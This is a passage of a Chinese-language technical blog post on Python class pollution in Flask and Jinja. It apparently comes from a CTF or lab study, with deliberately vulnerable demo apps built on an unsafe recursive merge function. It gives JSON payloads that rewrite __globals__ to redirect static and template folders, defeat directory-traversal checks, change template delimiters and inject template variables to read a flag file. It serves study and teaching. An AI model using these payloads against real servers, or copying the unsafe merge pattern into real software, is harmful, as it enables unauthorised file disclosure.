+<h6 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h6><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;static_folder&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;./&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>static_folder</code> 或者 <code>_static_folder</code> 都行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111210325608.png"
+                      alt="image-20240111210325608"
+                ></p>
+<p><strong>污染后访问 <code>/static/flag</code> 即可访问到文件了</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111210340963.png"
+                      alt="image-20240111210340963"
+                ></p>
+<h5 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a><code>os.path.pardir</code></h5><p>这个<code>os</code>模块下的变量会影响<code>flask</code>的模板渲染函数<code>render_template</code>的解析，所以也收录在<code>flask</code>部分，模拟的环境如下：</p>
+<p>html 文件和 flag 文件同上</p>
+<p>app.py</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>直接访问<code>http://domain/xxx</code>时会使用<code>render_tempaltes</code>渲染<code>templates/xxx</code>文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111220619972.png"
+                      alt="image-20240111220619972"
+                ></p>
+<p>如果尝试目录穿越则会导致<code>render_template</code>函数报错</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111221002379.png"
+                      alt="image-20240111221002379"
+                ></p>
+<p>根据报错信息的调用栈可以来到这段代码</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105049691-1067181145.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105049691-1067181145.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105056882-616179342.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105056882-616179342.png"
+                      alt="img"
+                ></a></p>
+<p>跟进95行的<code>get_source</code>函数，来到<code>Lib/site-packages/jinja2/loaders.py</code></p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105103715-1715379768.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105103715-1715379768.png"
+                      alt="img"
+                ></a></p>
+<p>继续跟进195行的<code>split_template_path</code>函数</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105114125-1116989441.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105114125-1116989441.png"
+                      alt="img"
+                ></a></p>
+<p>结合函数注释可以了解到这个函数将会把传入的模板路径按照<code>/</code>进行分割，在34行的逻辑判断上决定了（其余的部分逻辑值基本为假）整个<code>if</code>语句是否为真，显然需要改语句为假避免触发34行的<code>raise</code>。34行中的<code>os.path.pardir</code>值即为<code>..</code>，所以只要修改该属性为任意其他值即可避免报错，从而实现<code>render_template</code>函数的目录穿越</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105121312-663675572.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105121312-663675572.png"
+                      alt="img"
+                ></a></p>
+<p>修改为无关的<code>koishi</code>：</p>
+<h6 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1"></a>payload1</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;os&quot;: &#123;</span><br><span class="line">                &quot;path&quot;: &#123;</span><br><span class="line">                    &quot;pardir&quot;: &quot;koishi&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111221205486.png"
+                      alt="image-20240111221205486"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111221236591.png"
+                      alt="image-20240111221236591"
+                ></p>
+<h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h6><p>在下面jinja的研究中，我自己又发现了一个修改的方式，这个方式有点像上面那个指定static文件夹的方式，这个修改方式需要在没访问需要去的界面时进行操作，否则有缓存的话会失效。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;jinja_env&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;template_folder&quot;</span>: <span class="string">&quot;./&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h5 id="Jinja语法标识符"><a href="#Jinja语法标识符" class="headerlink" title="Jinja语法标识符"></a>Jinja语法标识符</h5><p>在默认的规则规则下，常用<code>Jinja</code>语法标识符有<code>&#123;&#123; Code &#125;&#125;</code>、<code>&#123;% Code %&#125;</code>、&#96;&#96;，当然对于我们需要<code>RCE</code>的需求来说，通常前两者才需要留意。而<code>Flask</code>官方文档中明确告知了，这些语法标识符均是可以依照<code>Jinja</code>中修改的：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105144799-1907488324.png"
+                      alt="img"
+                ></p>
+<p>在<code>Jinja</code>文档中展示了对这些语法标识符进行替换的方法：<a class="link"   target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment" >API — Jinja Documentation (3.1.x) (palletsprojects.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，即对<code>Jinja</code>的环境类的相关属性赋值，里面也有语法标识符的开始和结束符号的变量：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111222844407.png"
+                      alt="image-20240111222844407"
+                ></p>
+<p>而在<code>Flask</code>中使用了<code>Flask</code>类（<code>Lib/site-packages/flask/app.py</code>）的装饰器装饰后的<code>jinja_env</code>方法实现上述的功能；</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105211530-505675831.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105211530-505675831.png"
+                      alt="img"
+                ></a></p>
+<p>经过装饰器的装饰后，简单来说可以将该方法视为属性，对该方法的获取就能实现方法调用，类似<code>Flask.jinja_env</code>就相当于<code>Flask.jinja_env()</code>。</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105219514-2070062201.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105219514-2070062201.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105225947-1658688272.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105225947-1658688272.png"
+                      alt="img"
+                ></a></p>
+<p>跟进其中调用的<code>create_jinja_environment</code>，结合注释就可以发现<code>jinja_env</code>方法返回值就是<code>Jinja</code>中的环境类（实际上是对原生的<code>Jinja</code>环境类做了继承，不过在使用上并无多大区别），所以我们可以直接采用类似<code>Flask.jinja_env.variable_start_string = &quot;xxx&quot;</code>来实现对<code>Jinja</code>语法标识符进行替换</p>
+<p>模拟的环境如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;#templates/index.html#&#125;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;Look this -&gt; [[flag]] &lt;- try to make it become the real flag&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>app.py</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;go check /index before merge it&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>按照之前想的，使用payload</p>
+<h6 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h6><p>（需要在访问对应页面前进行）</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;jinja_env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;variable_start_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[[&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;]]&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>传入后，再去访问index，实际情况是内容并没有按我们想要的渲染，发现<code>flag</code>值还是没有被填充进来，也就是语法标识符没有被解析，而还是之前的样子</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111223832722.png"
+                      alt="image-20240111223832722"
+                ></p>
+<p><code>Flask</code>默认会对一定数量内的模板文件编译渲染后进行缓存，下次访问时若有缓存则会优先渲染缓存，所以输入<code>payload</code>污染之后虽然语法标识符被替换了，但渲染的内容还是按照污染前语生成的缓存，由于缓存编译时并没有存在<code>flag</code>变量，所以自然没有被填充<code>flag</code>。关于模板缓存的相关设置也可以在<code>Jinja</code>的环境类中设定，在刚才上面<code>Jinja</code>的官方文档链接稍微下方点的位置介绍了这个值。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111224122360.png"
+                      alt="image-20240111224122360"
+                ></p>
+<p>这个值在environment创建时被初始化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111233418876.png"
+                      alt="image-20240111233418876"
+                ></p>
+<p>这个变量与之前的 variable_start_string 有点不同，它在 LRUCache 对象中，这个变量在通过merge函数进行操作时，没有获取到capacity元素的值，于是就创建了一个“capacity”，这和之前的不一样（同理，想要修改它的<code>_mapping</code>也是不行的），而且就算修改了capacity的值也没有作用，缓存如果在的话，访问对应网页也会加载，而不会判断当前缓存是否已满。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111233839788.png"
+                      alt="image-20240111233839788"
+                ></p>
+<p>所以需要我们在<code>Flask</code>服务启动后（当然这里演示就是重启下<code>Flask</code>服务就行了，对于题目来说一般就是重启容器，或是在污染之后再访问模板）先输入<code>payload</code>再访问<code>index</code>路由即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111235354521.png"
+                      alt="image-20240111235354521"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111235435916.png"
+                      alt="image-20240111235435916"
+                ></p>
+<h5 id="Jinja语法全局数据"><a href="#Jinja语法全局数据" class="headerlink" title="Jinja语法全局数据"></a><code>Jinja</code>语法全局数据</h5><p>实际上包括函数、变量、过滤器这三者都能被自定义的添加到<code>Jinja</code>语法解析时的环境，操作方式于<code>Jinja</code>语法标识符中完全类似</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105320194-987334030.png"
+                      alt="img"
+                ></p>
+<p>这里以增加变量为例子给出模拟的环境如下：</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;#templates/index.html#&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;flag if permission else &quot;No way!&quot;&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>app.py</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>直接访问会由于没有设定<code>permission</code>值导致<code>if</code>条件为假返回<code>No way!</code>而不是<code>flag</code></p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105334386-1640095407.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105334386-1640095407.png"
+                      alt="img"
+                ></a></p>
+<p>所以将其赋值为任意逻辑非空值让条件为真即可</p>
+<h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;__init__&quot;: &#123;</span><br><span class="line">    &quot;__globals__&quot;: &#123;</span><br><span class="line">      &quot;app&quot;: &#123;</span><br><span class="line">        &quot;jinja_env&quot;: &#123;</span><br><span class="line">          &quot;globals&quot;:&#123;</span><br><span class="line">            &quot;permission&quot;: true</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240111235925462.png"
+                      alt="image-20240111235925462"
+                ></p>
+<h5 id="模板编译时的变量"><a href="#模板编译时的变量" class="headerlink" title="模板编译时的变量"></a>模板编译时的变量</h5><p>在<code>flask</code>中如使用<code>render_template</code>渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的<code>Jinja</code>语法进行解析转化为<code>AST</code>，而在语法树的根部即<code>Lib/site-packages/jinja2/compiler.py</code>中<code>CodeGenerator</code>类的<code>visit_Template</code>方法纯在一段有趣的逻辑</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105350870-1852736359.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127105350870-1852736359.png"
+                      alt="img"
+                ></a></p>
